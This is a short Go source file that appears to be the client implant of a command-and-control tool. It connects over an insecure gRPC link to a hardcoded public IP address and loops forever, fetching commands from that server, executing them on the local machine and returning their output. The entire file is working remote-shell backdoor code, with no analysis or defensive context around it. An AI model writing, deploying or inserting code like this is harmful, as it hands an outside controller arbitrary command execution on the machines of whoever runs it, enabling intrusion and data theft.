package main

import (
	router "c2/router"
	"context"
	"flag"
	"log"
	"os/exec"
	"strings"
	"time"

	"google.golang.org/grpc"
)

var (
	addr = flag.String("addr", "3.224.148.116:9698", "Address")
)

func main() {
	conn, err := grpc.Dial(*addr, grpc.WithInsecure())
	if err != nil {
		log.Fatalf("Error Dialing Server", err)
	}
	defer conn.Close()
	client := router.NewServerClient(conn)
	//ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	ctx := context.Background()
	//defer cancel()
	var req = new(router.Empty)
	for {
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Fatalf("Error Fetching Command", err)
		}
		if cmd.In == "" {

			time.Sleep(3 * time.Second)
			continue
		}
		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		client.SendResponse(ctx, cmd)
	}
}
